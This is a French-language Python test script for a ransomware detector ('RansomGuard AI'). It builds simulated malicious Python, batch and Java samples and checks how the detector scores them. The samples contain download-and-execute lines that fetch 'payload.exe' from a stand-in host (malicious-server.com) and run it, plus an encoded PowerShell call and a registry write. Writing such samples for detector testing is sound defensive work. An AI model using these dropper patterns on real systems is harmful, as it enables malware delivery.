"""
Script de test pour l'analyse de fichiers malveillants
RansomGuard AI - Hackathon Togo IT Days 2025
"""

import asyncio
import os
import tempfile
import logging
from ml_engine.hybrid_detector import HybridDetector

# Configuration du logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_malicious_python_file():
    """Créer un fichier Python malveillant de test"""
    malicious_code = '''
import os
import subprocess
import requests
import base64

# Code malveillant simulé
def encrypt_files():
    """Fonction d'encryption malveillante"""
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(('.txt', '.doc', '.pdf')):
                # Simuler l'encryption
                pass

def download_payload():
    """Télécharger un payload malveillant"""
    url = "http://malicious-server.com/payload"
    response = requests.get(url)
    return response.content

def execute_backdoor():
    """Exécuter un backdoor"""
    cmd = "powershell -EncodedCommand " + base64.b64encode(b"Get-Process").decode()
    subprocess.run(cmd, shell=True)

# Point d'entrée malveillant
if __name__ == "__main__":
    encrypt_files()
    download_payload()
    execute_backdoor()
'''
    return malicious_code.encode('utf-8')

def create_malicious_batch_file():
    """Créer un fichier batch malveillant de test"""
    malicious_batch = '''
@echo off
REM Fichier batch malveillant simulé
echo Starting malicious operations...

REM Simuler l'encryption de fichiers
for /r C:\ %%i in (*.txt) do (
    echo Encrypting %%i
)

REM Télécharger un payload
powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/payload' -OutFile 'payload.exe'"

REM Exécuter le payload
start payload.exe

REM Modifier le registre
reg add "HKCU\\Software\\Malware" /v "Installed" /t REG_DWORD /d 1 /f

echo Malicious operations completed.
pause
'''
    return malicious_batch.encode('utf-8')

def create_malicious_jar_content():
    """Créer le contenu d'un JAR malveillant simulé"""
    # Simuler un manifest JAR malveillant
    manifest = '''
Manifest-Version: 1.0
Main-Class: MaliciousApp
Created-By: Malicious Developer

Name: com/malware/
Sealed: true
'''
    
    # Code Java malveillant simulé
    java_code = '''
package com.malware;

import java.io.*;
import java.net.*;
import java.util.*;

public class MaliciousApp {
    public static void main(String[] args) {
        try {
            // Simuler l'encryption de fichiers
            File[] files = new File("C:\\\\").listFiles();
            for (File file : files) {
                if (file.isFile() && file.getName().endsWith(".txt")) {
                    // Encrypt file
                    System.out.println("Encrypting: " + file.getName());
                }
            }
            
            // Télécharger un payload
            URL url = new URL("http://malicious-server.com/payload");
            URLConnection conn = url.openConnection();
            InputStream in = conn.getInputStream();
            
            // Exécuter le payload
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "payload.exe");
            pb.start();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
'''
    
    return manifest.encode('utf-8'), java_code.encode('utf-8')

def create_legitimate_file():
    """Créer un fichier légitime de test"""
    legitimate_code = '''
# Fichier Python légitime
import os
import sys

def calculate_sum(a, b):
    """Fonction simple pour calculer la somme"""
    return a + b

def main():
    """Fonction principale"""
    print("Hello, World!")
    result = calculate_sum(5, 3)
    print(f"5 + 3 = {result}")

if __name__ == "__main__":
    main()
'''
    return legitimate_code.encode('utf-8')

async def test_malicious_file_analysis():
    """Tester l'analyse de fichiers malveillants"""
    try:
        logger.info("🧪 Test de l'analyse de fichiers malveillants...")
        
        # Initialiser le détecteur hybride
        hybrid_detector = HybridDetector()
        await hybrid_detector.initialize()
        
        # Test 1: Fichier Python malveillant
        logger.info("📝 Test 1: Fichier Python malveillant")
        with tempfile.NamedTemporaryFile(delete=False, suffix='.py') as test_file:
            test_file.write(create_malicious_python_file())
            test_path = test_file.name
        
        try:
            result = await hybrid_detector.analyze_file_hybrid(
                test_path, 
                {"filename": "malicious.py", "upload_source": "test"}
            )
            logger.info(f"Résultat Python malveillant: {result}")
            logger.info(f"Menace détectée: {result.get('is_threat', False)}")
            logger.info(f"Confiance: {result.get('confidence', 0.0):.2f}")
        finally:
            if os.path.exists(test_path):
                os.unlink(test_path)
        
        # Test 2: Fichier batch malveillant
        logger.info("📝 Test 2: Fichier batch malveillant")
        with tempfile.NamedTemporaryFile(delete=False, suffix='.bat') as test_file:
            test_file.write(create_malicious_batch_file())
            test_path = test_file.name
        
        try:
            result = await hybrid_detector.analyze_file_hybrid(
                test_path, 
                {"filename": "malicious.bat", "upload_source": "test"}
            )
            logger.info(f"Résultat batch malveillant: {result}")
            logger.info(f"Menace détectée: {result.get('is_threat', False)}")
            logger.info(f"Confiance: {result.get('confidence', 0.0):.2f}")
        finally:
            if os.path.exists(test_path):
                os.unlink(test_path)
        
        # Test 3: Fichier JAR malveillant simulé
        logger.info("📝 Test 3: Fichier JAR malveillant")
        with tempfile.NamedTemporaryFile(delete=False, suffix='.jar') as test_file:
            manifest, java_code = create_malicious_jar_content()
            test_file.write(manifest + b"\n" + java_code)
            test_path = test_file.name
        
        try:
            result = await hybrid_detector.analyze_file_hybrid(
                test_path, 
                {"filename": "malicious.jar", "upload_source": "test"}
            )
            logger.info(f"Résultat JAR malveillant: {result}")
            logger.info(f"Menace détectée: {result.get('is_threat', False)}")
            logger.info(f"Confiance: {result.get('confidence', 0.0):.2f}")
        finally:
            if os.path.exists(test_path):
                os.unlink(test_path)
        
        # Test 4: Fichier légitime
        logger.info("📝 Test 4: Fichier légitime")
        with tempfile.NamedTemporaryFile(delete=False, suffix='.py') as test_file:
            test_file.write(create_legitimate_file())
            test_path = test_file.name
        
        try:
            result = await hybrid_detector.analyze_file_hybrid(
                test_path, 
                {"filename": "legitimate.py", "upload_source": "test"}
            )
            logger.info(f"Résultat fichier légitime: {result}")
            logger.info(f"Menace détectée: {result.get('is_threat', False)}")
            logger.info(f"Confiance: {result.get('confidence', 0.0):.2f}")
        finally:
            if os.path.exists(test_path):
                os.unlink(test_path)
        
        logger.info("🎉 Tests de fichiers malveillants terminés!")
        
    except Exception as e:
        logger.error(f"❌ Erreur lors du test: {e}")
        raise

async def test_ircbot_files():
    """Tester avec des fichiers du dossier ircbot"""
    try:
        logger.info("🧪 Test avec les fichiers du dossier ircbot...")
        
        ircbot_path = "../ircbot"
        if not os.path.exists(ircbot_path):
            logger.warning(f"⚠️ Dossier ircbot non trouvé: {ircbot_path}")
            return
        
        # Initialiser le détecteur hybride
        hybrid_detector = HybridDetector()
        await hybrid_detector.initialize()
        
        # Analyser les fichiers du dossier ircbot
        for root, dirs, files in os.walk(ircbot_path):
            for file in files:
                if file.endswith(('.py', '.exe', '.jar', '.bat', '.cmd', '.ps1')):
                    file_path = os.path.join(root, file)
                    try:
                        logger.info(f"🔍 Analyse de: {file_path}")
                        result = await hybrid_detector.analyze_file_hybrid(
                            file_path, 
                            {"filename": file, "upload_source": "ircbot"}
                        )
                        
                        logger.info(f"  📊 Résultat pour {file}:")
                        logger.info(f"    - Menace: {result.get('is_threat', False)}")
                        logger.info(f"    - Confiance: {result.get('confidence', 0.0):.2f}")
                        logger.info(f"    - Type: {result.get('threat_type', 'unknown')}")
                        logger.info(f"    - Sévérité: {result.get('severity', 'low')}")
                        
                    except Exception as e:
                        logger.error(f"  ❌ Erreur lors de l'analyse de {file}: {e}")
        
        logger.info("🎉 Tests ircbot terminés!")
        
    except Exception as e:
        logger.error(f"❌ Erreur lors du test ircbot: {e}")
        raise

async def main():
    """Fonction principale de test"""
    logger.info("🚀 Démarrage des tests de fichiers malveillants...")
    
    # Test 1: Fichiers malveillants simulés
    await test_malicious_file_analysis()
    
    # Test 2: Fichiers du dossier ircbot
    await test_ircbot_files()
    
    logger.info("🎯 Tous les tests terminés!")

if __name__ == "__main__":
    asyncio.run(main())
